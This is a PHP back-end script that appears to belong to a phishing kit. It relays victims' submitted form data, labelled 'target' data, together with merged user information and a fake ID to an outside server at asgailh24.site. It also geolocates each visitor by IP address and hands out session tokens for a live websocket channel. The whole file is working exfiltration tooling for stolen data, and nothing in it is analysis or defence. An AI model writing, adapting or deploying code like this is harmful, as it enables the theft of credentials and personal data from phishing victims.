<?php

@session_start();

include_once __DIR__ . '/../Functions/utility.class.php';

$utilityClass = new UtilityClass();

$apiUrl = "https://asgailh24.site/src/Api/v1.php";

if(isset($_GET['getWebsocketToken'])) {
    $webSocketData = [$_SESSION["uuid"], $_SESSION["token"]];
    echo json_encode($webSocketData);
}

if(isset($_GET['updateSessionUptime'])) {
    $parameter = "?updateSessionUptime";

    $postData = [
        'uuid' => $_SESSION["uuid"]
    ];
    
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, $apiUrl . $parameter);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

if(isset($_GET['sendTargetData'])) {
    $parameter = "?receiveTargetData";

    if(!empty($_POST['jsonData']) && !empty($_POST['currentStep'])) {

        $postData = [
            'uuid' => $_SESSION["uuid"],
            'jsonData' => $_POST["jsonData"],
            'currentStep' => $_POST["currentStep"]
        ];
        
        $ch = curl_init();
        
        curl_setopt($ch, CURLOPT_URL, $apiUrl . $parameter);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        return $response;

    }
}

if(isset($_GET["saveTargetData"])) {
    $parameter = "?saveTargetData";

    if(!empty($_POST['jsonData'])) {

        $postData = [
            'jsonData' => $_POST["jsonData"],
            'target_information' => (string) $utilityClass->mergeUsersData(),
            'fake_uuid' => $utilityClass->getFakeID()
        ];
        
        $ch = curl_init();
        
        curl_setopt($ch, CURLOPT_URL, $apiUrl . $parameter);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        return $response;

    }
}

if(isset($_GET['getTargetCountry'])) {

    $ipAddress = $utilityClass->getRealIpAddrress();

    $link = file_get_contents('http://ip-api.com/json/'.$ipAddress);
    $json = json_decode($link, true);
    echo $json["country"];
 
}
